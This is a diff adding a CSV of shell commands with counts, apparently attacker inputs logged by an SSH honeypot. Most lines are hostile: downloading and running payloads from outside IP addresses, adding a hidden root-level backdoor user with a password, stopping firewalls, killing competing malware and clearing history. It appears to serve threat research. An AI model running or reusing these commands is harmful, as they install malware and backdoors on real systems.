@@ -1,0 +1,114 @@
+﻿﻿input,COUNT(input)
+passwd,24
+"free -m",21
+"ls -la /var/run/sftp.pid",15
+uname,13
+"ps x",13
+"/etc/init.d/iptables stop",9
+"service iptables stop",9
+"SuSEfirewall2 stop",9
+"reSuSEfirewall2 stop",9
+"chmod 777 ttxsyg",9
+"./ttxsyg &",9
+"wget -c http://23.234.25.74:9621/ttxsyg",8
+"ls -l",7
+"wget http://23.234.19.202/i/a06",6
+"uname -m",6
+"uname -r",6
+"wget -c http://66.117.9.14:81/79",4
+./79,4
+"echo -n test",4
+"wget http://38.68.20.127/i/a09",3
+id,3
+"useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter",3
+"echo ""xuelp123""|passwd --stdin butter",3
+"echo butter:xuelp123|chpassw",3
+"uname -a",2
+exit,2
+"wget -c http://66.117.9.14:81/49",2
+./49,2
+"wget http://111.73.45.231:280/npc",2
+"chattr +ia /bin",2
+"chattr +ia /usr/bin",2
+"chattr +ia /tmp",2
+"ls /etc/init.d | grep -E '[0-9a-z]{10}' | awk '{print $1}' | xargs killall",2
+"cd /etc/init.d",2
+"ls /etc/init.d | grep -E '[0-9a-z]{10}' | awk '{print $1}' | xargs rm -f",2
+"rm -f /lib/libgcc4.so",2
+"rm -f /lib/libgcc.so",2
+"chattr -ia /bin",2
+"chattr -ia /usr/bin",2
+"chattr -ia /tmp",2
+"killall ntpd .sshd ps sshpa fdsfsfvff gdmorpen gfhjrtfyhuf whitptabil smarvtd nhgbhhj rewgtf3er4t byv832 DbSecuritySpt getty sfewfesfs .SSH2 .SSHH2 pro proh zl atddd dsfrefr ferwfrre gfhddsfew ksapdd kysapdd sdmfdsfhjfe skysapdd xfsdxd trffg pojie freeBSD cupsdd cupsddh bond0 bond1 ddos998 cupsd .synest node sswlzyyyangji yjcy64 Linux2.6 Linux2.6a Linux2.6b Linux2.6c Linux2.4 Linux2.4a Linux2.4b Linux2.4c Linux2.4C Linux2.6C mysql ksdrips mysql515 kerne",2
+"ps -ef | grep .sshdd | grep -v grep | awk '{print $2}' | xargs kill -9",2
+"ps -ef | grep .sshhdd | grep -v grep | awk '{print $2}' | xargs kill -9",2
+"mv /usr/bin/wget /usr/bin/wget1",2
+"mv /usr/bin/curl /usr/bin/curl1",2
+"history -c",2
+"wget -O /tmp/32 http://114.232.48.50:5888/xudp",2
+"chmod 0755 /32",2
+fltacawipf,2
+zjlocpzmxn,2
+psuqcosaoz,2
+cjezejhuti,2
+datkxcacwh,2
+cinrziuxed,2
+urzqdwxfie,2
+qfqvthfwyj,2
+rwffjxweay,2
+sdlcfobljr,2
+cvjcqocjaj,2
+framtiqzxx,2
+"wget http://38.68.20.127/i/a09.zip",2
+"chmod 755 /tmp/inst",2
+"killall inst",2
+"/tmp/inst &",2
+"rm -f /tmp/inst*",2
+rmvbauhiex,2
+ddjscgqpfs,2
+yxagdaziwa,2
+zxmcawvncj,2
+nygfsmxpxx,2
+rqxyaudenw,2
+bxvmsfpuio,2
+zhbykbswea,2
+kdtfkbdoox,2
+dntlrriyxu,2
+tgsngozqdp,2
+ls,1
+w,1
+"wget -c http://23.234.25.74:9620/ttxsyg",1
+"wget http://23.234.19.202/i/a07",1
+"wget http://23.234.19.202/i/a09",1
+"wget -c http://66.117.9.14:81/76",1
+./76,1
+"wget http://38.68.20.127/i/a08",1
+bash,1
+"chmod 0755 /tmp/./npc",1
+/tmp/./npc,1
+"curl http://218.244.148.238:1122/npc1 -o /tmp/npc1",1
+"chmod 0755 /tmp/./npc1",1
+/tmp/./npc1,1
+"wget http://38.68.20.127/i/a07",1
+"chmod 755 /tmp/tm",1
+"killall tm",1
+"/tmp/tm &",1
+"chmod 755 /tmp/kiss",1
+"killall kiss",1
+"/tmp/kiss &",1
+"chmod 777 /tmp/2801",1
+"killall 777 2801",1
+"/tmp/2801 &",1
+"rm -f /tmp/tm*",1
+"rm -f /tmp/kiss*",1
+"rm -f /tmp/2801*",1
+"show ip rout",1
+"show runn",1
+"show ip interface brief",1
+"nohup /tmp/32 > /dev/null 2>&1 &",1
+"chmod 777 /tmp/smtpd",1
+"killall 777 smtpd",1
+"/tmp/smtpd &",1
+"rm -f /tmp/smtpd*",1
+"echo ""Uname: ""`uname -a`",1
+"echo ""ID: ""`id`",1
